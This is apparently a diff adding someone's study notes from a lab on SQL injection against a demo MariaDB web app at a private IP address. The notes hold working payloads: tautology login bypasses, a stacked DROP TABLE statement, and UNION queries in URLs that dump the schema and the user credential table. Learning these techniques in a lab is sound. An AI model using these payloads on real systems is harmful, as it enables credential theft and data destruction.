@@ -1,0 +1,68 @@
+SQL Demo http://10.50.15.67/ PORT 80 for SQL
+mariadb
+SHOW databases (commands must end with ;)
+	information_schema (might be important later)
+	myspql (confing)
+	performance_schema (config)
+	session (user data)
+SHOW TABLES FROM session;
+	Tires
+	car
+	session_log
+	user
+	userinfo
+SELECT * FROM session.car;
+	populates fields/columns of data
+
+USE session; 
+	MariaDB [session]> DESCRIBE car;
+	lists the parameters (int/varchar and length for all car fields)
+	SELECT * FROM car UNION SELECT * FROM Tires; (UNION command joins commands)(tables must have equal table field amounts)
+	SELECT * FROM car UNION SELECT tireid, name, size, cost, 1, 2; (fixes above command and inserts 1/2 in the blank fields that Tires wouldnt have had)
+
+Testing SQL Injection
+Truth statement checking : tom' OR 1='1
+SELECT id FROM users WHERE name=tom' OR 1='1 AND pass=tom' OR 1='1
+
+STACK Statements
+	SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
+
+	Nesting Statements
+	php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+
+	Ignore Statements
+	SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+
+Walthrough	
+	Truth statement, ID # of Columns for vulnerable page, golden statement, tailored sql queries
+
+	navigate to 10.50.15.67	
+	Inspect webpage to know if the login will post/get
+	username: tom' OR 1='1 ; password: tom' OR 1='1
+	modify webpage to send GET instead of Post and resubmit creds -> output the full table of creds
+	
+	http://10.50.15.67/Union.html
+	POST METHOD
+	Truth statements crafted off each available car option
+	Audi' UNION SELECT 1,2,3,4,5;# (Tested stacking to see if vulnerable)
+	Audi' UNION SELECT 1,@@version ;# (pulls version of SQL server)
+
+	GET METHOD
+	Perform a GET and then modify the URL to test for truth as seen below
+	http://10.50.15.67/uniondemo.php?Selection=2&Submit=Submit
+	http://10.50.15.67/uniondemo.php?Selection=2%20or%201=1
+	modify URL to perform valid SQL queries
+	http://10.50.15.67/uniondemo.php?Selection=2 UNION SELECT 1,name,3 FROM car
+	http://10.50.15.67/uniondemo.php?Selection=2%20UNION%20SELECT%201,2,@@version
+
+	GOLDEN STATEMENT
+	GET URL?selection=2 UNION SELECT table_schema, table_name, column_name FROM information_schema.columns
+	UNION SELECT * FROM session.user
+
+	Commenting out
+	see where your input is showing up in the SQL syntax
+	explained in sql_comment_out.txt
+
+	
+
+
